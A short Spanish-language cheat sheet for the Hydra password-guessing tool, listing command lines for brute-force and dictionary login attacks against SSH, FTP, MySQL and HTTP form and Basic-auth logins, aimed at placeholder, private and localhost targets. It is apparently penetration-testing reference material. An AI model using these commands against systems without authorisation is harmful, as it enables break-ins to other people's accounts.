# Hydra

## Básico

```bash
hydra -l admin -p admin <servicio>://<ip>             # Ataque admin/admin
hydra -C credentials.txt <servicio>://<ip>            # Ataque user:pass
hydra -L users.txt -p 123456 <servicio>://<ip>        # Ataque de diccionario de usuarios
hydra -l admin -P passwords.txt <servicio>://<ip>     # Ataque de diccionario de contraseñas
hydra -L users.txt -P passwords.txt <servicio>://<ip> # Ataque de diccionario de usuarios y contraseñas
hydra -l admin -p admin -s 3000 <servicio>://<ip>     # Especificar puerto
hydra -l admin -p admin -t 4 <servicio>://<ip>        # Especificar número de hilos
hydra -l admin -p admin -t 4 -W 20 <servicio>://<ip>  # Especificar tiempo de espera
hydra -U <servicio>                                   # Detalles del modulo de servicio
```

## Servicios

```bash
hydra -L users -P rockyou.txt ssh://192.168.0.1   # shh
hydra -L users -P rockyou.txt ftp://192.168.0.1   # ftp
hydra -L users -P rockyou.txt mysql://192.168.0.1 # mysql
```

## http-post-form

Formularios HTTP post

```bash
hydra -l admin -p admin 192.168.0.1 http-post-form '/http-login:name=^USER^&password=^PASS^:Invalid credentials'
hydra -s 3000 -l admin -p 1234 localhost http-post-form "/login:user=^USER^&password=^PASS^:Login incorrecto"
```

## http-get

Validaciones básicas http con esquema Basic realm

```
hydra -l admin -P passwords localhost -s 3000 http-get /protected
```
